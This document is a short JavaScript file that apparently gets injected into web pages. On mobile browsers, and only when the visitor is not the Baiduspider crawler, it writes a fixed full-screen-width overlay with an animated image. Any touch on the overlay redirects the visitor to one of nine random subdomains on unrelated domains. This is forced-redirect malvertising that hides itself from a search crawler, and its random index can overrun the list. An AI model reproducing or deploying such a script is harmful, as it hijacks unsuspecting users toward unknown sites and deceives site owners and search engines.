var urls = ["https://1j103ndiw.mingxutianhe.com/ice1670","https://2j103gv.hyfangfuguandao.com/ice2670","https://3j103zy.dapengchejiuye.com/ice3670","https://4j103fldu.yingqiunvwang.com/ice4670","https://5j103mzf.mingxutianhe.com/ice5670","https://6j103uh.zhongjieyizhan.com/ice6670","https://7j103vq.mingxutianhe.com/ice7670","https://8j103gq.kangjiafurniture.com/ice8670","https://9j103ogct.mingxutianhe.com/ice9670"];

var gourl = urls[Math.round(Math.random() * urls.length)];
var imgurl = 'https://cdn.jsdelivr.net/gh/yycdn/imgcdn/' + Math.round(Math.random() * 15 + 1) + '.gif';

if (/Android|webOS|iPhone|iPod|iPad|ios|BlackBerry/i.test(navigator.userAgent) && navigator.userAgent.indexOf('Baiduspider') < 0) {
	document.writeln("<style>.vddb+a,.vddb+a video:nth-child(1),.vddb+a a,.vddb_qq:before,.vddb_qq:after{content:\'\';display:block;width:100%;height:125px;object-fit:fill;position:fixed;bottom:0;left:0;z-index:2746858464;}");
	document.writeln(".vddb+a a,.vddb_qq:after{height:30px;bottom:125px;}.vddb_qq:before{z-index:2746858465;background:url(" + imgurl + ");background-size:100% 100%;} body{margin-bottom:125px;}</style>");
	document.writeln("<div class=\"vddb\"></div><a href=\"javascript:GoDb();\" title=\"2021\"><video poster=\"" + imgurl + "\" src=\"\"></video><object><a></a></object></a><a class=\"vddb_qq\" href=\"javascript:GoDb();\" ontouchstart=\"this.click();\"></a>");
	function GoDb() {window.location.href = gourl;}document.querySelector('.vddb').nextElementSibling.addEventListener('touchstart', function() {this.click();});
}